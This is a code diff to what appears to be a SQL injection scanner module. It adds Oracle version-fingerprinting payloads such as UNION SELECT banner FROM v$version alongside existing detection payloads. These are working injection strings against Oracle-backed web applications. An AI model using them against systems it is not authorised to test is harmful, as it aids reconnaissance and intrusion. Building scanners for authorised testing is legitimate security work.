@@ -1,6 +1,8 @@
 # app/modules/scanner/payloads.py
 """
 SQL injection payload definitions for Oracle detection.
+Phase 1: Oracle Detection
+Phase 2: Oracle Version Fingerprinting (ADDED)
 """
 
 from dataclasses import dataclass
@@ -18,10 +20,13 @@ class DetectionPayload:
 
 
 class OracleDetectionPayloads:
-    """Oracle-specific detection payloads for Phase 1."""
+    """Oracle-specific detection payloads."""
 
     def __init__(self):
         self.payloads: List[DetectionPayload] = [
+            # ============================================================
+            # PHASE 1: Oracle Detection Payloads
+            # ============================================================
             # Dual table detection - Oracle-specific
             DetectionPayload(
                 payload="' UNION SELECT NULL FROM dual--",
@@ -84,6 +89,45 @@ class OracleDetectionPayloads:
             ),
         ]
 
+        # ============================================================
+        # PHASE 2: Version Fingerprinting Payloads (ADDED)
+        # ============================================================
+
+        # These are referenced by oracle_version.py
+        # They are kept here for consistency but used separately
+        self.version_payloads = [
+            {
+                "payload": "' UNION SELECT banner FROM v$version--",
+                "description": "v$version banner",
+                "weight": 35,
+            },
+            {
+                "payload": "' UNION SELECT banner,NULL FROM v$version--",
+                "description": "v$version with NULL",
+                "weight": 30,
+            },
+            {
+                "payload": "' UNION SELECT version FROM v$instance--",
+                "description": "v$instance version",
+                "weight": 25,
+            },
+            {
+                "payload": "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
+                "description": "v$version first row",
+                "weight": 20,
+            },
+            {
+                "payload": "' UNION SELECT product FROM product_component_version--",
+                "description": "product_component_version",
+                "weight": 20,
+            },
+            {
+                "payload": "' UNION SELECT version FROM product_component_version--",
+                "description": "product_component_version version",
+                "weight": 20,
+            },
+        ]
+
     def get_all_payloads(self) -> List[DetectionPayload]:
         """Return all detection payloads."""
         return self.payloads
@@ -91,3 +135,11 @@ class OracleDetectionPayloads:
     def get_payloads_by_weight(self, min_weight: int = 10) -> List[DetectionPayload]:
         """Get payloads with weight >= min_weight."""
         return [p for p in self.payloads if p.weight >= min_weight]
+
+    # ============================================================
+    # Phase 2: Version Payload Methods (ADDED)
+    # ============================================================
+
+    def get_version_payloads(self) -> List[Dict[str, any]]:
+        """Get version fingerprinting payloads."""
+        return self.version_payloads
